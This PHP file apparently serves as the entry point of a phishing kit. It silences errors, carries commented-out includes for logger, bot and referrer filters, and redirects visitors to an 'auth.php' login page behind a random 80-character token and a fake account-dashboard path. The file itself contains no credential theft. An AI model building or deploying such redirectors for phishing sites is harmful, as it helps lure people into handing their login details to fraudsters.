<?php 
 
@error_reporting(0);

// require_once 'web/includes/logger.php';
// include 'web/includes/bot.php';
// include 'web/includes/ref.php';
// include 'hidden.php';
	function genRandString($length = 10) {
	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, strlen($characters) - 1)];
	    }
	    return $randomString;
	}

	$_SESSION['randString'] 	= genRandString(80);
	
	header("Location: web/auth.php?web/auth/dashboard#/dashboard/overviewAccounts/overview/index={$_SESSION['randString']}");

?>